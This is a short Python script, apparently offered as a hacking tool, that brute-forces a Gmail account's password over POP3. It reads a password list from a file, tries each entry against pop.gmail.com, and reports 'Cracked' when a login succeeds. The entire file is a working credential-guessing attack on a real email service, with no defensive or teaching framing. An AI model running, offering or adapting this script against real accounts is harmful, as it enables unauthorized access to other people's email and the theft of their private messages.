import poplib
mailServer = 'pop.gmail.com'

emailID =input('Enter Email ID: ')
passfile=input('Enter Password File location: ')

def hit(email,Pass):
    try:
        myEmailConnection = poplib.POP3_SSL(mailServer)
        myEmailConnection.user(email)
        myEmailConnection.pass_(Pass)
    except:
        print('Trying: '+Pass)
        return False
    else:
        print('Password Found: '+Pass)
        return True

f=open(passfile)
for i in f:
    if(hit(emailID,i)):
        print('Cracked')
        break
print('Completed')
